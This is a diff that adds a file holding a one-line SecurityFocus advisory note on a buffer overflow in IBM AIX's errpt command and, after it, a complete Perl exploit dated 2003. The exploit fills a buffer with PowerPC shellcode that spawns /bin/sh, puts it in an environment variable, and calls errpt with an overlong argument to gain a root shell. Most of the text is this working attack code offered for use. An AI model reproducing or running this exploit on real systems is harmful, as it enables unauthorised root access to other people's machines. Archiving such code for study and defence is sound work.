@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/5885/info
+
+The IBM AIX errpt command is prone to a locally exploitable buffer overflow condition. It is possible to exploit this condition to execute arbitrary attacker-supplied instructions with root privileges.
+
+#!/usr/bin/perl
+# FileName: x_errpt_aix5.pl
+# Exploit command errpt for Aix5L to get a root shell.
+# Tested  : on Aix5.1
+# Author  : watercloud@xfocus.org
+# Site    : www.xfocus.org   www.xfocus.net
+# Date    : 2003-4-16
+# Announce: use as your owner risk!
+
+$BUFF="A". "\x7c\xa5\x2a\x79"x500;
+
+#shellcode from lsd-pl and modified by watercloud 2003-4 for Aix5L
+$BUFF.="\x7e\x94\xa2\x79\x40\x82\xff\xfd\x7e\xa8\x02\xa6\x3a\xb5\x01\x40";
+$BUFF.="\x88\x55\xfe\xe0\x7e\x83\xa3\x78\x3a\xd5\xfe\xe4\x7e\xc8\x03\xa6";
+$BUFF.="\x4c\xc6\x33\x42\x44\xff\xff\x02\xb6\x05\xff\xff\x7e\x94\xa2\x79";
+$BUFF.="\x7e\x84\xa3\x78\x40\x82\xff\xfd\x7e\xa8\x02\xa6\x3a\xb5\x01\x40";
+$BUFF.="\x88\x55\xfe\xe0\x7e\x83\xa3\x78\x3a\xd5\xfe\xe4\x7e\xc8\x03\xa6";
+$BUFF.="\x4c\xc6\x33\x42\x44\xff\xff\x02\xb7\x05\xff\xff\x38\x75\xff\x04";
+$BUFF.="\x38\x95\xff\x0c\x7e\x85\xa3\x78\x90\x75\xff\x0c\x92\x95\xff\x10";
+$BUFF.="\x88\x55\xfe\xe1\x9a\x95\xff\x0b\x4b\xff\xff\xd8/bin/sh";
+
+%ENV=(); $ENV{CC}=$BUFF;
+
+exec "/usr/bin/errpt","-T","A"."\x2f\xf2\x2a\x40"x1320;
+#EOF
